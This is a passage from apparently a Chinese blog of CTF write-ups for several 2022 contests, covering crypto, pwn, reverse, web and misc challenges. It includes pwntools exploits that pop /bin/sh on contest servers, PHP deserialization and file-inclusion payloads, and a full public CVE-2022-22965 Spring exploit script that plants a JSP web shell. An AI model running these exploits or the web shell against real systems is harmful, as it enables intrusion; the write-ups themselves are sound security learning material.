15932130442747899994421453654008731830580286370350900523295205445599466666709544075950517531382971246869745425091317996973135364990272852701046046315136273893166361180330563013617843\np=boom(p_,n,2)\nq=boom(q_,n,2)\nt=n//p//q\nif (t*p*q!=n):\n    print(\"error\");\n    exit(0)\ne =114\n\n\nphi_n= (p - 1) * (q - 1)*(t-1)\n\nt=gmpy2.gcd(e,phi_n)\ne=e//t\nd=gmpy2.invert(e,phi_n)\nm=gmpy2.powmod(c,d,n)\nmsg=gmpy2.iroot(m,t)\nprint(bytes.fromhex(hex(msg[0])[2:]))\n```\n\n\n\n# pwn #\n\n## 签到 ##\n\n传入`\\x00`绕过判断\n\n![](/img/wp/2022/2022hectf-10.png)\n\nexp\n```python\nfrom pwn import *\np=remote('49.234.8.239','30531')\np.sendline('\\x00')\np.interactive()\n```\n\n\n输入`:!/bin/sh`，使得vim中可以执行系统命令\n\n![](/img/wp/2022/2022hectf-11.png)\n\n\n\n\n## 真·签到 ##\n\n传入一个`0xFFFFF82`即可\n\n![](/img/wp/2022/2022hectf-12.png)\n\n\n![](/img/wp/2022/2022hectf-13.png)\n\n\n## static ##\n\n\n栈溢出构造`rep`链，执行`execve(\"/bin/sh\")`\n\n![](/img/wp/2022/2022hectf-14.png)\n\n![](/img/wp/2022/2022hectf-15.png)\n\nexp\n```python\nfrom pwn import *\nimport time\ncontext.arch='amd64'\ncontext.log_level='debug'\nrdi=0x00000000004018b2\nrsi=0x000000000040661e\nrdx=0x00000000004017bf\nret=0x000000000040f408\nsyscall=0x00000000004012e3\nrax=0x0000000000451aa7\nread=0x450ff0\n\n#p=remote()\n#p=process('./static')\n#gdb.attach(p,'bp 0x401e3c')\n#pause()\np=remote('121.4.119.164','32430')\ne=ELF('./static',checksec=0)\np.send(b'a'*0x29)\npayload=flat(\n        rdi,0,\n        rsi,e.bss(0x100),\n        rdx,0x20,\n        read,\n        rdi,e.bss(0x100),\n        rsi,0,\n        rdx,0,\n        ret,\n        rax,0x3b,\n        syscall);\np.send(b'a'*0x28+b'b'*8+b'c'*8+payload)\n\np.interactive()\n#for i in range(8):\n#    p.sendline('+')\n#for i in range(8):\n#    p.sendline('+')\n\np.sendline('/bin/sh\\x00')\np.interactive()\n```\n![](/img/wp/2022/2022hectf-16.png)\n\n# reverse #\n\n## apk ##\n\n*赛后复现*\n\n![](/img/wp/2022/2022hectf-17.png)\n\n\n\n## 贝斯 ##\n\n输入的数据经过某种加密后对每个字节取反，然后与`P0w3r`的内容比较\n在`Enc0de`中看字符集发现是base32加密\n\n![](/img/wp/2022/2022hectf-18.png)\n\n\n将`P0w3r`变量的内容提取出来后异或`0xff`，base32解码即可\n\nexp\n```python\nimport base64\n\na=[0xB5,0xBD,0xBC,0xAA,0xB8,0xA9,0xBC,0xB8,0xAF,0xB1,0xBA,0xAA,0xB8,0xCA,0xB3,0xAC,0xB0,0xB2,0xA5,0xAA,0xCD,0xC9,0xB4,0xAB,0xB0,0xAD,0xAE,0xA7,0xBA,0xCB,0xA5,0xAD,0xB1,0xA5,0xBD,0xB8,0xAC,0xCA,0xBB,0xAA,0xB8,0xB1,0xA5,0xBA,0xB0,0xCB,0xAB,0xB5,0xB8,0xB1,0xAB,0xBC,0xB2,0xA9,0xA5,0xAE,0xB8,0xB1,0xC9,0xAE]\ne=''\n\nfor i in a:\n    e+=chr(i^0xff)\ne+='===='\nprint(base64.b32decode(e))\n```\n\n\n\n\n## HelloIos ##\n\n一个简单的比较，异或`0x1F`然后加1\n\n![](/img/wp/2022/2022hectf-19.png)\n\n\nexp\n```python\na='X[]LZeX{ttqAwqmc'\ne=''\nfor i in a:\n    e+=chr((ord(i)^0x1f)+1)\nprint(e)\n```\n\n\n## author'sB0x ##\n\n观察发现`init_S`,`init_Key`,`permute_S`,`create_key_stream`这几个函数中用到的数据是固定的，用来生成`KeyStream`\n\n![](/img/wp/2022/2022hectf-20.png)\n\n直接粘贴到编译器运行\n\n```c\n#include<stdio.h>\n\nunsigned char S[256]={};\nunsigned char T[256]={};\nunsigned char Key[]=\"thisiskey\";\nunsigned char KeyStream[32]={};\n\nunsigned int *init_S(void)\n{\n  unsigned int *result; // rax\n  int i; // [rsp+Ch] [rbp-4h]\n\n  for ( i = 0; i <= 255; ++i )\n  {\n    result = S;\n    S[i] = i;\n  }\n  return result;\n}\n\nunsigned char *init_Key(void)\n{\n  unsigned char *result; // rax\n  int i; // [rsp+Ch] [rbp-4h]\n\n  for ( i = 0; i <= 255; ++i )\n  {\n    result = T;\n    T[i] = Key[i % 9];\n  }\n  return result;\n}\n\nunsigned int *permute_S(void)\n{\n  unsigned int *result; // rax\n  int v1; // [rsp+4h] [rbp-Ch]\n  int i; // [rsp+8h] [rbp-8h]\n  int v3; // [rsp+Ch] [rbp-4h]\n\n  v3 = 0;\n  for ( i = 0; i <= 255; ++i )\n  {\n    v3 = (S[i] + v3 + (char)T[i]) % 256;\n    v1 = S[i];\n    S[i] = S[v3];\n    result = S;\n    S[v3] = v1;\n  }\n  return result;\n}\n\nchar  create_key_stream(int a2)\n{\n  int v2; // eax\n  char result; // al\n  int v4; // [rsp+10h] [rbp-10h]\n  int v5; // [rsp+14h] [rbp-Ch]\n  int v6; // [rsp+18h] [rbp-8h]\n  int i; // [rsp+1Ch] [rbp-4h]\n\n  v5 = 0;\n  v6 = 0;\n  for ( i = 0; ; KeyStream[v5++] = S[(S[v6] + S[i]) % 256] )\n  {\n    v2 = a2--;\n    result = v2 != 0;\n    if ( !result )\n      break;\n    i = (i + 1) % 256;\n    v6 = (v6 + S[i]) % 256;\n    v4 = S[i];\n    S[i] = S[v6];\n    S[v6] = v4;\n  }\n  return result;\n}\n\nvoid main(){\n   init_S();\n  init_Key();\n  permute_S();\n  create_key_stream(32);\n  for (int i=0;i<32;i++){\n\tprintf(\"%d \",KeyStream[i]);\n  }\n\n}\n```\n\n运行后得到`[139,176,166,182,170,108,177,66,249,64,195,137,150,140,2,41,86,253,212,116,98,236,64,117,90,37,237,197,126,172,174,59]`，这个就是`KeyStream`的值\n\n`KeyStream`的值与`Cry`的值异或，得到flag\n\n\nexp\n```python\na=[0xC3,0xF5,0xE5,0xE2,0xEC,0x17,0xE5,0x2A,0xCA,0x3,0xB6,0xFD,0xC1,0xBC,0x70,0x44,0x10,0xCD,0xA6,0x13,0x0B,0x9A,0x73,0x6,0x0E,0x4D,0xDE,0x95,0x12,0x9C,0xD9,0x46]\nb=[139,176,166,182,170,108,177,66,249,64,195,137,150,140,2,41,86,253,212,116,98,236,64,117,90,37,237,197,126,172,174,59]\ne=''\n\nfor i,v in enumerate(a):\n    e+=chr(v^b[i])\nprint(e)\n```\n\n## 勇士斗恶龙 ##\n\n在ida中通过搜索字符串跳转到程序主要函数，得到函数对于程序的偏移地址`38B0`\n\n![](/img/wp/2022/2022hectf-21.png)\n\nx64dbg动态调试程序，在主要函数设置断点\n\n![](/img/wp/2022/2022hectf-22.png)\n\n当程序中断时，rcx的值是`00000170E3A824B0`，储存了两个指针，指向了勇士和恶龙的对象\n\n![](/img/wp/2022/2022hectf-23.png)\n\n\n\n![](/img/wp/2022/2022hectf-24.png)\n\n\n`0x170e3a828e0+0x20`地址处储存了勇士的金币数，将其修改为`0xffff`,购买高级的装备，将内存地址转移到`0x170e3a82950+0x20`指向的地址处，输入`a`攻击恶龙，观察内存数据变化,当恶龙血量为`520`时得到`flag`\n\n![](/img/wp/2022/2022hectf-25.png)","tags":["wp","HECTF","2022竞赛"],"categories":["wp"]},{"title":"2022强国杯技术技能大赛东部晋级赛wp","url":"/posts/82e1297c/","content":"\nRank：13，被打爆了\n\n# web #\n\n## md5_php ##\n\n\n```php\n<?php\nheader('Content-type:text/html;charset=utf-8');\nhighlight_file(__file__);\n\n\n\nif (isset($_GET['md5'])){\n   $md5=$_GET['md5'];\n   if ($md5==md5($md5))\n       show_source('le.php');\n   else\n       die(\"快了解MD5\");\n}else{\n    die(\"MMMMDDDD5555\");\n}\n\n?>\n```\nmd5弱比较，找一个加密前后都是0e开头的值\n\n传入`?md5=0e215962017`\n\n拿到`le.php`的源码\n\n\n```php\n<?php\n\n$file = $_GET['file'];\nif(isset($file))\n{\n    if( strpos( $file, \"good\" ) !==  false || strpos( $file, \"luck\" ) !==  false || strpos( $file, \"index\")){\n        include ($file . '.php');\n    }\n    else{\n        echo \"Sorry, we currently only support flag and luck.\";\n    }\n}\n\n?>\n```\n\n传入的值中要包含`good`，`luck`或者`index`\n\n用伪协议读内容，用`index/../flag`绕过判断\n\n最后传入`?file=php://filter/convert.base64-encode/resource=index/../flag`拿到flag\n\n\n## 命令执行 ##\n\n通过报错页面得知是`spring`\n\n`github`搜最新的`spring rce`\n\n通过`CVE-2022-22965`的`POC`getshell\n\n```python\n# Author: @Rezn0k\n# Based off the work of p1n93r\n\nimport requests\nimport argparse\nfrom urllib.parse import urlparse\nimport time\n\n# Set to bypass errors if the target site has SSL issues\nrequests.packages.urllib3.disable_warnings()\n\npost_headers = {\n    \"Content-Type\": \"application/x-www-form-urlencoded\"\n}\n\nget_headers = {\n    \"prefix\": \"<%\",\n    \"suffix\": \"%>//\",\n    # This may seem strange, but this seems to be needed to bypass some check that looks for \"Runtime\" in the log_pattern\n    \"c\": \"Runtime\",\n}\n\n\ndef run_exploit(url, directory, filename):\n    log_pattern = \"class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bprefix%7Di%20\" \\\n                  f\"java.io.InputStream%20in%20%3D%20%25%7Bc%7Di.getRuntime().exec(request.getParameter\" \\\n                  f\"(%22cmd%22)).getInputStream()%3B%20int%20a%20%3D%20-1%3B%20byte%5B%5D%20b%20%3D%20new%20byte%5B2048%5D%3B\" \\\n                  f\"%20while((a%3Din.read(b))!%3D-1)%7B%20out.println(new%20String(b))%3B%20%7D%20%25%7Bsuffix%7Di\"\n\n    log_file_suffix = \"class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp\"\n    log_file_dir = f\"class.module.classLoader.resources.context.parent.pipeline.first.directory={directory}\"\n    log_file_prefix = f\"class.module.classLoader.resources.context.parent.pipeline.first.prefix={filename}\"\n    log_file_date_format = \"class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat=\"\n\n    exp_data = \"&\".join([log_pattern, log_file_suffix, log_file_dir, log_file_prefix, log_file_date_format])\n\n    # Setting and unsetting the fileDateFormat field allows for executing the exploit multiple times\n    # If re-running the exploit, this will create an artifact of {old_file_name}_.jsp\n    file_date_data = \"class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat=_\"\n    print(\"[*] Resetting Log Variables.\")\n    ret = requests.post(url, headers=post_headers, data=file_date_data, verify=False)\n    print(\"[*] Response code: %d\" % ret.status_code)\n\n    # Change the tomcat log location variables\n    print(\"[*] Modifying Log Configurations\")\n    ret = requests.post(url, headers=post_headers, data=exp_data, verify=False)\n    print(\"[*] Response code: %d\" % ret.status_code)\n\n    # Changes take some time to populate on tomcat\n    time.sleep(3)\n\n    # Send the packet that writes the web shell\n    ret = requests.get(url, headers=get_headers, verify=False)\n    print(\"[*] Response Code: %d\" % ret.status_code)\n\n    time.sleep(1)\n\n    # Reset the pattern to prevent future writes into the file\n    pattern_data = \"class.module.classLoader.resources.context.parent.pipeline.first.pattern=\"\n    print(\"[*] Resetting Log Variables.\")\n    ret = requests.post(url, headers=post_headers, data=pattern_data, verify=False)\n    print(\"[*] Response code: %d\" % ret.status_code)\n\n\ndef main():\n    parser = argparse.ArgumentParser(description='Spring Core RCE')\n    parser.add_argument('--url', help='target url', required=True)\n    parser.add_argument('--file', help='File to write to [no extension]', required=False, default=\"shell\")\n    parser.add_argument('--dir', help='Directory to write to. Suggest using \"webapps/[appname]\" of target app',\n                        required=False, default=\"webapps/ROOT\")\n\n    file_arg = parser.parse_args().file\n    dir_arg = parser.parse_args().dir\n    url_arg = parser.parse_args().url\n\n    filename = file_arg.replace(\".jsp\", \"\")\n\n    if url_arg is None:\n        print(\"Must pass an option for --url\")\n        return\n\n    try:\n        run_exploit(url_arg, dir_arg, filename)\n        print(\"[+] Exploit completed\")\n        print(\"[+] Check your target for a shell\")\n        print(\"[+] File: \" + filename + \".jsp\")\n\n        if dir_arg:\n            location = urlparse(url_arg).scheme + \"://\" + urlparse(url_arg).netloc + \"/\" + filename + \".jsp\"\n        else:\n            location = f\"Unknown. Custom directory used. (try app/{filename}.jsp?cmd=id\"\n        print(f\"[+] Shell should be at: {location}?cmd=id\")\n    except Exception as e:\n        print(e)\n\n\nif __name__ == '__main__':\n    main()\n```\n\n\n![](/img/wp/2022/2022qgb-east-1.png)\n\n\n## PHP反序列化2 ##\n\n源码\n```php\n<?php\nclass main{\n    protected $ClassObj;\n\n    function __construct(){\n        $this->ClassObj = new easy();\n    }\n\n    function __destruct(){\n        $this->ClassObj->action();\n    }\n\n}\nclass easy{\n    function action(){\n        echo \"hello Hacker\";\n    }\n}\nclass evil{\n    private $file;\n    function action(){\n        eval($this->file);\n    }\n}\n\n\nif(isset($_GET['a'])){\n    $a = $_GET['a'];\n    if(stristr($a,'eval')!==False){\n        die('Hacker</br>');\n    }elseif (stristr($a,'flag')!==False) {\n        die('Hacker</br>');\n    }else{\n        unserialize($_GET['a']);\n    }\n}else {\n    $user  = new main();\n    highlight_file(__FILE__);\n}\n?>\n```\n\n\nexp\n```php\n<?php\nclass main{\n\tprotected $ClassObj;\n\tfunction __construct(){\n\t\t$this->ClassObj = new evil();\n\t}\n}\nclass evil{\n\tprivate $file = 'system(\"cat /fla*\");';\n}\n$user = new main();\necho urlencode(serialize($user));\n?>\n```\n\n\n\n\n## phpti ##\n\n字符串逃逸\n\n```php\nclass a\n{\n    public $uname;\n    public $password;\n    public function __construct($uname,$password)\n    {\n        $this->uname=$uname;\n        $this->password=$password;\n    }\n    public function __wakeup()\n    {\n        if($this->password==='admin')\n        {\n            include \"r11.php\";\n        }\n        else {\n            echo \"hacker\\n\";\n        }\n    }\n}\nfunction filter($string){\n    return str_replace('phpinfo()','phpinfo()up',$string);\n}\n$uname=$_GET['admin']\n$password=123456;\n$ser=filter(serialize(new a($uname,$password)));\n$test=unserialize($ser);\n```\n\n`?admin=phpinfo()phpinfo()phpinfo()phpinfo()phpinfo()phpinfo()phpinfo()phpinfo()phpinfo()phpinfo()phpinfo()phpinfo()phpinfo()phpinfo()phpinfo()%22;s:8:%22password%22;s:5:%22admin%22;}`\n\n\nflag.php\n```\nclass admin\n{\n    public $root;\n    function __destruct()\n\n    {\n        echo $this->root;\n        echo \"3123123123123\\n\";\n          if ($this->root ==='print_r(scandir(dirname(__FILE__)));')\n        {\n            echo \"123412341234\";\n        }\n\n    }\n    function __toString(){\n        return \"aaaaaaaa\";\n    }\n}\n```\n\nexp\n```\nPOST /flag.php HTTP/1.1\nHost: host:port\nContent-Length: 369\nCache-Control: max-age=0\nUpgrade-Insecure-Requests: 1\nOrigin: null\nContent-Type: multipart/form-data; boundary=----WebKitFormBoundary7Pufxj5tsIY9p2yA\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\nAccept-Encoding: gzip, deflate\nAccept-Language: zh-CN,zh;q=0.9\nCookie: PHPSESSID=n480589952d85l2vvkeb01sh9g\nConnection: close\n\n------WebKitFormBoundary7Pufxj5tsIY9p2yA\nContent-Disposition: form-data; name=\"PHP_SESSION_UPLOAD_PROGRESS\"\n\n123\n------WebKitFormBoundary7Pufxj5tsIY9p2yA\nContent-Disposition: form-data; name=\"file\"; filename=\"|O:5:\\\"admin\\\":1:{s:4:\\\"root\\\";s:36:\\\"print_r(scandir(dirname(__FILE__)));\\\";}\"\nContent-Type: text/plain\n\n\n------WebKitFormBoundary7Pufxj5tsIY9p2yA--\n```\n\n\n# misc #\n\n## 不要被迷惑 ##\n\n筛选`http`协议的包，找到`flag.zip`\n\n![](/img/wp/2022/2022qgb-east-2.png)\n\n导出压缩包后爆破密码，得到`123321`\n\n得到一串jjencode编码字符\n\n```javascript\n$=~[];$={___:++$,$$$$:(![]+\"\")[$],__$:++$,$_$_:(![]+\"\")[$],_$_:++$,$_$$:({}+\"\")[$],$$_$:($[$]+\"\")[$],_$$:++$,$$$_:(!\"\"+\"\")[$],$__:++$,$_$:++$,$$__:({}+\"\")[$],$$_:++$,$$$:++$,$___:++$,$__$:++$};$.$_=($.$_=$+\"\")[$.$_$]+($._$=$.$_[$.__$])+($.$$=($.$+\"\")[$.__$])+((!$)+\"\")[$._$$]+($.__=$.$_[$.$$_])+($.$=(!\"\"+\"\")[$.__$])+($._=(!\"\"+\"\")[$._$_])+$.$_[$.$_$]+$.__+$._$+$.$;$.$$=$.$+(!\"\"+\"\")[$._$$]+$.__+$._+$.$+$.$$;$.$=($.___)[$.$_][$.$_];$.$($.$($.$$+\"\\\"\"+$.$$$$+(![]+\"\")[$._$_]+$.$_$_+\"\\\\\"+$.__$+$.$__+$.$$$+\"{\\\\\"+$.__$+$._$_+$.$$$+\"\\\\\"+$.__$+$.__$+$.__$+\"\\\\\"+$.__$+$.$_$+$.$_$+$._+\"\\\\\"+$.__$+$.__$+$._$_+$.$$$_+\"\\\\\"+$.__$+$.$$_+$.__$+\"\\\\\"+$.__$+$._$_+$._$$+\"\\\\\"+$.__$+$.__$+$.$$_+\"\\\\\"+$.__$+$._$_+$.___+\"\\\\\"+$.__$+$.$_$+$.___+(![]+\"\")[$._$_]+\"\\\\\"+$.__$+$.___+$.$_$+\"\\\\\"+$.__$+$.$$$+$.__$+\"\\\\\"+$.__$+$.$_$+$.__$+$.$$_$+\"\\\\\"+$.__$+$.__$+$.$__+\"\\\\\"+$.__$+$.___+$._$_+\"\\\\\"+$.__$+$.$_$+$.$$_+\"\\\\\"+$.__$+$.$$$+$.___+\"\\\\\"+$.__$+$.$$_+$._$$+\"\\\\\"+$.__$+$._$_+$.$$_+\"\\\\\"+$.__$+$.___+$.$$_+\"\\\\\"+$.__$+$._$_+$._$_+\"\\\\\"+$.__$+$._$$+$.__$+$.__+\"\\\\\"+$.__$+$.$_$+$._$$+\"\\\\\"+$.__$+$.$$_+$.$$$+\"\\\\\"+$.__$+$.__$+$._$$+\"\\\\\"+$.__$+$._$$+$.___+\"\\\\\"+$.__$+$.___+$.$__+$._$+\"}\"+\"\\\"\")())();\n```\n\n![](/img/wp/2022/2022qgb-east-3.png)\n\n\n## PCAP文件分析  ##\n\n`flag.pcapng`找到没用的`flag.zip`\n\n`02.pcapng`提取出一个`02.zip`，一个`2.png`\n\n`2.png`上看到压缩包密码`Vu8#fI9`，解压得到`flag2.png`\n\n修改`flag2.png`高度得到flag\n\n\n![](/img/wp/2022/2022qgb-east-4.png)\n\n\n\n## 平正开 ##\n\n*赛后复现*\n\n\n每一位取反后加一\n\n```python\nf=open('aaa','rb')\nd=f.read()\nf=open('1.zip','wb')\nfor i in d:\n    if ord(i)==0:\n        f.write('\\x00')\n        continue\n    print((ord(i)^0xff)+1,ord(i))\n    f.write(chr((ord(i)^0xff)+1))\nf.close()\n```\n\n伪加密后得到一串`社会主义核心价值观加密`字符串，解密得到flag\n\n\n# reverse #\n\n\n## re2 ##\n\n\n先用`pyinstxtractor`解包，找到`test_obfuscated.pyc`，反编译，得到源代码\n\n```python\nimport pygame\nimport sys\nimport time\nimport random\ndifficulty = 25\nframe_size_x = 720\nframe_size_y = 480\ncheck_errors = pygame.init()\npygame.display.set_caption('Lets Play')\ngame_window = pygame.display.set_mode((frame_size_x, frame_size_y))\nblack = pygame.Color(0, 0, 0)\nwhite = pygame.Color(255, 255, 255)\nred = pygame.Color(255, 0, 0)\ngreen = pygame.Color(0, 255, 0)\nblue = pygame.Color(0, 0, 255)\nfps_controller = pygame.time.Clock()\nsnake_pos = [\n    100,\n    50]\nsnake_body = [\n    [\n        100,\n        50],\n    [\n        90,\n        50],\n    [\n        80,\n        50]]\nf_body = [\n    [\n        40,\n        29],\n    [\n        40,\n        30],\n    ...\n    ...\n    ...\n    [\n        624,\n        38]]\nfood_pos = [\n    random.randrange(1, frame_size_x // 10) * 10,\n    random.randrange(1, frame_size_y // 10) * 10]\nfood_spawn = True\ndirection = 'RIGHT'\nchange_to = direction\nscore = 0\n\ndef game_over():\n    OOOO000000O000OO0 = pygame.font.SysFont('times new roman', 90)\n    O000O0OO0OO0O0O0O = OOOO000000O000OO0.render('YOU DIED', True, red)\n    OOO00OO00O0O00O00 = O000O0OO0OO0O0O0O.get_rect()\n    OOO00OO00O0O00O00.midtop = (frame_size_x / 2, frame_size_y / 4)\n    game_window.fill(black)\n    game_window.blit(O000O0OO0OO0O0O0O, OOO00OO00O0O00O00)\n    show_score(0, red, 'times', 20)\n    pygame.display.flip()\n    time.sleep(3)\n    pygame.quit()\n    sys.exit()\n\n\ndef show_score(OO00000O0O000OO0O, O0O0O0OOOO000O000, O0O0000O00OO00OO0, O0O000OOOOOO00O0O):\n    O00O000000OO0O0OO = pygame.font.SysFont(O0O0000O00OO00OO0, O0O000OOOOOO00O0O)\n    O0O0O0O0O0O00O00O = O00O000000OO0O0OO.render('Score : ' + str(score), True, O0O0O0OOOO000O000)\n    O000O0OOOO000OO0O = O0O0O0O0O0O00O00O.get_rect()\n    if OO00000O0O000OO0O == 1:\n        O000O0OOOO000OO0O.midtop = (frame_size_x / 10, 15)\n    else:\n        O000O0OOOO000OO0O.midtop = (frame_size_x / 2, frame_size_y / 1.25)\n    game_window.blit(O0O0O0O0O0O00O00O, O000O0OOOO000OO0O)\n\nfor event in pygame.event.get():\n    if event.type == pygame.QUIT:\n        pygame.quit()\n        sys.exit()\n    elif event.type == pygame.KEYDOWN:\n        if event.key == pygame.K_UP or event.key == ord('w'):\n            change_to = 'UP'\n        if event.key == pygame.K_DOWN or event.key == ord('s'):\n            change_to = 'DOWN'\n        if event.key == pygame.K_LEFT or event.key == ord('a'):\n            change_to = 'LEFT'\n        if event.key == pygame.K_RIGHT or event.key == ord('d'):\n            change_to = 'RIGHT'\n        if event.key == pygame.K_ESCAPE:\n            pygame.event.post(pygame.event.Event(pygame.QUIT))\nif change_to == 'UP' and direction != 'DOWN':\n    direction = 'UP'\nif change_to == 'DOWN' and direction != 'UP':\n    direction = 'DOWN'\nif change_to == 'LEFT' and direction != 'RIGHT':\n    direction = 'LEFT'\nif change_to == 'RIGHT' and direction != 'LEFT':\n    direction = 'RIGHT'\nif direction == 'UP':\n    snake_pos[1] -= 10\nif direction == 'DOWN':\n    snake_pos[1] += 10\nif direction == 'LEFT':\n    snake_pos[0] -= 10\nif direction == 'RIGHT':\n    snake_pos[0] += 10\nsnake_body.insert(0, list(snake_pos))\nif snake_pos[0] == food_pos[0] and snake_pos[1] == food_pos[1]:\n    score += 1\n    food_spawn = False\nelse:\n    snake_body.pop()\nif score == 1000:\n    game_window.fill(black)\n    for pos in f_body:\n        pygame.draw.rect(game_window, green, pygame.Rect(pos[0], pos[1], 1, 1))\n    pygame.display.flip()\n    time.sleep(10)\nelif not food_spawn:\n    food_pos = [\n        random.randrange(1, frame_size_x // 10) * 10,\n        random.randrange(1, frame_size_y // 10) * 10]\nfood_spawn = True\ngame_window.fill(black)\nfor pos in snake_body:\n    pygame.draw.rect(game_window, green, pygame.Rect(pos[0], pos[1], 10, 10))\npygame.draw.rect(game_window, white, pygame.Rect(food_pos[0], food_pos[1], 10, 10))\nif snake_pos[0] < 0 or snake_pos[0] > frame_size_x - 10:\n    game_over()\nif snake_pos[1] < 0 or snake_pos[1] > frame_size_y - 10:\n    game_over()\nfor block in snake_body[1:]:\n    if snake_pos[0] == block[0] and snake_pos[1] == block[1]:\n        game_over()\nshow_score(1, white, 'consolas', 20)\npygame.display.update()\nfps_controller.tick(difficulty)\ncontinue\n```\n\n\n通过`f_body`变量中储存的坐标画图得到flag\n\n```python\nfrom PIL import Image\n\nimg=Image.new('1',(1000,1000))\nf_body=[...]\nfor i in f_body:\n    img.putpixel(tuple(i),255)\nimg.show()\n```\n\n![](/img/wp/2022/2022qgb-east-5.png)","tags":["wp","2022竞赛","强国杯"],"categories":["wp"]},{"title":"2022台州市第二届网络安全大赛wp","url":"/posts/b1b57dcc/","content":"\n# 初赛 #\n\n## misc ##\n\n### bitlocker ###\n\n内存取证，在内存镜像中搜索`txt`文件，得到`BitLocker`恢复密钥\n\n![](/img/wp/2022//2022taizhou-1.png)\n\n\n导出后得到\n```txt\nBitLocker 驱动器加密恢复密钥\n\n恢复密钥用于恢复 BitLocker 保护的驱动器上的数据。\n\n若要验证该密码是否为正确的恢复密码，请将这些标记与恢复屏幕上显示的标记进行比较。\n\n恢复密钥标记: 118D5B0A-0C1F-4F\n完整恢复密钥标记: 118D5B0A-0C1F-4F76-A3B7-01658D566145\n\nBitLocker 恢复密钥:\n432696-262691-480018-407649-083578-365651-065142-713999\n```\n\n在windows7虚拟机上挂载`bitlocker.vmdk`，使用恢复密钥`432696-262691-480018-407649-083578-365651-065142-713999`解锁，拿到`flag`文件\n\n文件开头为`42 4d`，判断是bmp文件，但是文件头被修改了\n\n\n删掉文件头和文件尾，文件长度除以4后为`39949`，因式分解得到`7*13*439`，所以宽高是`439*91`\n\n\n用python生成一个宽为439，高为91的rgba格式的bmp文件，和原文件比较，还原文件头，得到flag\n\n![](/img/wp/2022//2022taizhou-2.png)\n\n\n### 皇帝的flag ###\n\ncrc报错，修改高度，得到二维码，扫码得到`‌‌‌‌‍‬‍‍‌‌‌‌‍‌﻿‍‌‌‌‌‍﻿‌‌只有聪明的人才能得到‌‌‌‌‌﻿‌﻿‌‌‌‌‍﻿‌‬flag‌‌‌‌‌﻿‌‌‌‌‌‌‍‍‌‬‌‌‌‌‍‍﻿﻿哦‌‌‌‌‍﻿‌‌‌‌‌‌‍‍‍﻿‌‌‌‌‍‌‍‌`\n\n在010中看到很多不可见字符，0宽得到密码`eMp3r0R_pWD`\n\nstegsolve分析，存在lsb隐写\n\n![](/img/wp/2022//2022taizhou-3.png)\n\n\n### 列文虎克的秘密 ###\n\n这是什么题呀，太离谱了，十位密码爆破。100分简单题到结束才三血\n\n*赛后复现*\n\n先修复`zip`头，改成`50 4B 03 04`，然后进行十位数字爆破，得到`874375984`\n\n图片尾看到`oursecret`特征块，密码是图片上的列文虎克名字`LeEuw3nh0ek`\n\n\n\n\n## reverse ##\n\n### EzMath1 ###\n\n先脱upx壳，在`TlsCallback_1`函数中找到程序实际用于检测的代码\n\n![](/img/wp/2022//2022taizhou-4.png)\n\n`sub_401210`函数检测输入的前7个字符\n\n![](/img/wp/2022//2022taizhou-5.png)\n\n\n`sub_401670`函数检测其余输入的字符\n\n![](/img/wp/2022//2022taizhou-6.png)\n\n\nexp\n```python\nfrom z3 import *\nv21=Int('v21')\nv22=Int('v22')\nv23=Int('v23')\nv24=Int('v24')\nv31=Int('v31')\nv32=Int('v32')\nv33=Int('v33')\ns=Solver()\ns.add(65*v33+24*v32+118*v31+126*v24+173*v23+179*v22+195*v21==0xFE5F)\ns.add(277*v33+236*v32+433*v31+484*v24+228*v23+142*v22+261*v21==0x28113)\ns.add(496*v33+309*v32+46*v31+135*v24+165*v23+7*v22+495*v21==152196)\ns.add(236*v33+250*v32+41*v31+247*v24+67*v23+251*v22+471*v21==0x1EFA4)\ns.add(457*v33+414*v32+271*v31+32*v24+244*v23+74*v22+113*v21==0x24273)\ns.add(221*v33+76*v32+263*v31+363*v24+49*v23+82*v22+405*v21==0x1B1AA)\ns.check()\na=\"Yqc77YD8jc''\"\ne=''\nr=s.model()\n\"\"\"\n[v21 = 71,\n v22 = 48,\n v23 = 100,\n v24 = 77,\n v31 = 52,\n v32 = 116,\n v33 = 104]\n\"\"\"\nr=[71, 48, 100, 77, 52, 116, 104]\nfor i in r:\n    e=e+chr(i)\nfor i in a:\n    e=e+chr(((ord(i)-1)^7))\nprint(e)\n```\n\n![](/img/wp/2022//2022taizhou-7.png)\n\n\n## pwn ##\n\n### reader ###\n\n利用`edit`中的偏移 向`0x4260`处写入`0x200`个字符，可以覆盖`stream`和`filename`变量\n\n```python\nfrom pwn import *\ndef edit(off,data):\n    p.sendlineafter('Exit','3')\n    p.sendlineafter('offset: ',str(off))\n    p.sendafter('data: ',data)\n\ndef open():\n    p.sendlineafter('Exit','1')\ndef read():\n    p.sendlineafter('Exit','2')\ndef close():\n    p.sendlineafter('Exit','4')\n\n#p=process('./reader')\np=remote('1.14.97.218','22385')\nopen()\nread()\n#gdb.attach(p,'b open')\nedit(0x200,p64(0)+p64(0)+p64(0)*2+b\"./flag\\x00\")\nopen()\np.interactive()\n```\n\n![](/img/wp/2022//2022taizhou-8.png)\n\n\n## web ##\n\n### TryGetPasswd ###\n\n*赛后复现*\n\n```php\n<?php\n$passwd = getenv(\"passwd\");\n# passwd 的格式为 [a-zA-z0-9]{10}\n$hintfile = \"/tmp/hint\".$passwd;\nsystem(\"touch $hintfile\");\n\nif (isset($_GET['passwd'])){\n    foreach ((new DirectoryIterator($_GET['dir'])) as $file){\n        echo $file->getSize().\"\\n<br>\";\n    }\n\n    if ($_GET[\"passwd\"]===$passwd){\n        eval($_GET[\"cmd\"]);\n    }\n\n}else{\n    highlight_file(__FILE__);\n}\n```\n\n获取到`passwd`后可以`rce`，而`DirectoryIterator`可以列目录，它的参数支持`glob://`伪协议，当存在文件时`$file->getSize()有回显`回显，这样就可以通过脚本遍历获取到`passwd`\n\n```python\nimport 